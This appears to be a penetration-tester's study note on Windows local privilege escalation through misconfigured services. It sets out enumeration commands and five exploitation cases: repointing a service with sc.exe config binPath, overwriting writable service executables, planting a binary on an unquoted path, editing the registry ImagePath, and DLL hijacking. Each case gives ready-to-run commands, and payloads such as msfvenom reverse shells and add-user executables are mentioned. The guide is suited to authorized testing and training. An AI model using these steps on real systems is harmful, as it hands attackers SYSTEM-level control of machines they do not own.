A service running as SYSTEM will execute whatever it is pointed at. If you control a link in its start chain and can trigger it, that execution is yours.

## Goal
Find a privileged service, prove you control one link in its execution chain, and prove you can trigger it - then swap in your payload.

## The gate (all three, or it is not a candidate)
```text
Privileged service account (LocalSystem / SYSTEM / admin)
+ a controllable link (service config / .exe / script / DLL / registry / path resolution)
+ a usable trigger (you can start/restart it, or a reboot / natural event will)
= candidate
```
Running as SYSTEM is **necessary but not sufficient** - without a controllable link *and* a trigger, a SYSTEM service is not exploitable.

Two ACLs decide everything, and they are on **different objects**:
- the **service object** (can I reconfigure it?) → AccessChk or `sc.exe sdshow`
- the **file** it runs (`.exe` / script / DLL) or its **directory** → `icacls`
- the **registry key** for the service → AccessChk or a PowerShell registry-ACL check

Checklist:
- [ ] service runs as SYSTEM / admin? (`StartName`)
- [ ] which link can I write - config / exe / dir / DLL / registry?
- [ ] can I start/restart it, or will a reboot? (`StartMode`, restart permission)
- [ ] backed up the original object before replacing?

# Commands

### Step 1: enumerate services + accounts
```powershell
Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName
```
This DUMPS every service; it does not filter. You filter by eye, matching TWO
columns on the SAME row:
- `StartName` = `LocalSystem` (this IS `NT AUTHORITY\SYSTEM`) / `.\Administrator` / a `*admin` acct -> **privileged**
- `PathName` = outside `C:\Windows\System32` (e.g. `C:\glassfish4\...`) -> **third-party / user-installed**

A row that is **both** privileged AND third-party is your candidate. `LocalService` /
`NetworkService` / a normal username in `StartName` is not privileged; System32 binaries are
Windows' own and normally unwritable.

```text
Name         StartMode  StartName    PathName
Spooler      Auto       LocalSystem  C:\Windows\System32\spoolsv.exe        <- SYSTEM but System32 -> skip
glassfish    Auto       LocalSystem  C:\glassfish4\...\domain1Service.exe   <- SYSTEM + third-party -> CANDIDATE
SomeUserSvc  Manual     bob          C:\Apps\thing.exe                      <- third-party but not privileged -> skip
```
Over WinRM / a bind shell this can return "Access denied" for a non-admin - use an RDP (interactive) logon (see [[01_orientation]]).

### Step 2: inspect one service (cmd.exe)
```batch
sc.exe qc <SERVICE>          :: BINARY_PATH_NAME + SERVICE_START_NAME
sc.exe query <SERVICE>       :: current state
sc.exe sdshow <SERVICE>      :: service DACL (raw SDDL)
```

### Step 3: check the relevant ACL
```batch
accesschk.exe /accepteula -uwcqv <user> <SERVICE>    :: service perms (SERVICE_CHANGE_CONFIG?)
icacls "C:\path\to\service.exe"                       :: file perms (F/M/W = replaceable)
icacls "C:\path\to\service-dir"                       :: dir perms (unquoted / DLL drop)
```
icacls masks: `F` full · `M` modify · `RX` read+execute · `R` read · `W` write. `(I)` = inherited (not set on purpose).

## Exploit

### Case 1: Weak service permissions (SERVICE_CHANGE_CONFIG)
**Check:** `accesschk.exe /accepteula -uwcqv <user> <SERVICE>` shows `SERVICE_CHANGE_CONFIG` (or `SERVICE_ALL_ACCESS`).
**Abuse:** repoint the binary, then restart.
```batch
sc.exe config <SERVICE> binPath= "C:\Users\Public\payload.exe"
sc.exe stop <SERVICE> & sc.exe start <SERVICE>
```
Mind the space after `binPath=`. Payload = an `adduser.exe` or an msfvenom `.exe` reverse shell → [[01_orientation#File transfer - Kali to Windows|file transfer]]. Restore the original `binPath=` afterwards.
**Verify:** `net localgroup Administrators`, or catch your shell, then `whoami`.
**Dead end / pivot:** can change config but cannot start/stop and no reboot → rabbit hole; move on.

### Case 2: Writable service executable or script
**Check:** `icacls "<PathName>.exe"` shows `(F)` / `(M)` / `(W)` for you or `BUILTIN\Users`; absent `(I)` means it was set deliberately.

icacls prints one line per ACE as `PRINCIPAL:(inherit-flags)(permission)`. Look **only** at lines
whose PRINCIPAL is you: your `whoami` name, or **any group** from `whoami /groups` (usually
`BUILTIN\Users`, `Authenticated Users`, `Everyone`). If one of those has `(F)`/`(M)`/`(W)`, you can
overwrite the file. Ignore `SYSTEM` / `Administrators` / `TrustedInstaller` lines - those are not you.
```text
C:\glassfish4\...\domain1Service.exe
  NT AUTHORITY\SYSTEM:(I)(F)      <- not you
  BUILTIN\Administrators:(I)(F)   <- not you
  BUILTIN\Users:(I)(M)            <- YOU (you are in Users) + Modify = WRITABLE -> Case 2
```
**Abuse:** back up, replace the file, restart.
```batch
copy "C:\Apps\svc.exe" "%TEMP%\svc.exe.bak"
copy /Y "C:\Users\Public\payload.exe" "C:\Apps\svc.exe"
sc.exe stop <SERVICE> & sc.exe start <SERVICE>
```
**Verify / restore** as in Case 1.
**Dead end / pivot:** file not writable, or cannot restart and it is not `Auto` (so no reboot help) → pivot.

> Being able to *run* the service binary yourself is irrelevant - launched from your shell it runs with **your** token, not the service account. Only execution **through the service** inherits SYSTEM.

### Case 3: Unquoted service path
**What it means:** an unquoted `PathName` with spaces is a **parsing / search-order ambiguity**, not a weaker privilege level. Windows tries each left-to-right candidate:
```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe  tries:
  C:\Program.exe
  C:\Program Files\Enterprise.exe
  C:\Program Files\Enterprise Apps\Current.exe   <- writable here? plant Current.exe
  ...\Current Version\GammaServ.exe (the real binary)
```
**Preconditions (all):** unquoted path + spaces + a writable earlier candidate directory + privileged execution + a trigger.
**Check:**
```batch
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls "C:\Program Files\Enterprise Apps"    :: BUILTIN\Users:(W)?
```
**Abuse:** place your payload as the interpreted filename in the writable candidate dir, then start the service.
```batch
copy /Y "C:\Users\Public\payload.exe" "C:\Program Files\Enterprise Apps\Current.exe"
sc.exe start <SERVICE>
```
**Dead end / pivot:** no writable earlier candidate dir → not exploitable; pivot.

### Case 4: Weak service registry permissions
**What it means:** the service's registry key may be editable even when the binary/config is not - repoint `ImagePath`.
**Check:**
```powershell
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> | Format-List
```
```batch
accesschk.exe /accepteula -kvuqsw <user> HKLM\System\CurrentControlSet\Services\<SERVICE>
```
**Abuse:** set `ImagePath` to your payload, restart.
```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\payload.exe" /f
sc.exe stop <SERVICE> & sc.exe start <SERVICE>
```
**Dead end / pivot:** no write on the key → pivot.

### Case 5: DLL hijacking / missing DLL
**What it means:** a service loads a DLL by search order; if you can write a DLL it loads - or supply a *missing* one in an earlier search path - your code runs with the service's privileges.
**Check (do this on a local clone - Procmon needs admin):** run [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), filter `Process Name is <svc>.exe` plus `Result is NAME NOT FOUND` on `.dll` paths to find a missing/writable DLL, then `icacls` that directory.
**Abuse:** drop a malicious DLL with the expected name in the first writable directory of the search order; trigger the service (or wait for a privileged user to launch it).
**Dead end / pivot:** safe DLL search mode + no writable search dir + no missing DLL → pivot. Detection here is largely manual.

## Correcting common misconceptions
- **System32 is not a "32-bit sandbox."** On 64-bit Windows it holds **64-bit** system binaries (the 32-bit copies live in `SysWOW64`). Ordinary users are blocked there by ACLs / ownership (TrustedInstaller), not by the folder name.
- A System32 binary is a poor **file-replacement** target under normal ACLs - but do not skip the **service object** itself: a weak service DACL (Case 1) or another link can still win.
- A writable file matters **only if the privileged service actually consumes it** in a controllable way.
- A reboot is a **risk-aware fallback** for `Auto`-start services when you cannot restart manually - never a casual default on a production system.

## Automated cross-check
```powershell
# import PowerUp first (transfer + `powershell -ep bypass`; see [[01_orientation]]):
Get-ModifiableServiceFile      # writable service binaries / configs
Get-UnquotedService            # unquoted-path candidates (AbuseFunction: Write-ServiceBinary)
```
[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) / [SharpUp](https://github.com/GhostPack/SharpUp) find candidates - confirm each one manually (their AbuseFunctions fail on some paths, e.g. service arguments). [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) for service / registry perms; [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) for DLL/file-load troubleshooting; [HackTricks - Windows Local Privilege Escalation](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) for deeper service/DLL edge cases.

## Helpline:
1. Two ACLs, two tools
```
service object -> accesschk -uwcqv <user> <svc>  OR  sc.exe sdshow <svc>   (can I reconfigure?)
file / dir     -> icacls "<path>"                                          (can I overwrite / drop?)
registry key   -> Get-Acl / accesschk on ...\Services\<svc>                (can I edit ImagePath?)
```

2. Restart / trigger
```
sc.exe stop <svc> & sc.exe start <svc>   |   Restart-Service <svc>   |   net stop/start <svc>
cannot restart + StartMode Auto -> a reboot may trigger it (risk-aware; avoid on real systems)
cannot restart + not Auto        -> dead end
```

3. Why "run it myself" fails
```
launching the service .exe from your shell runs it with YOUR token.
only the Service Control Manager starts it as the configured account (SYSTEM).
```
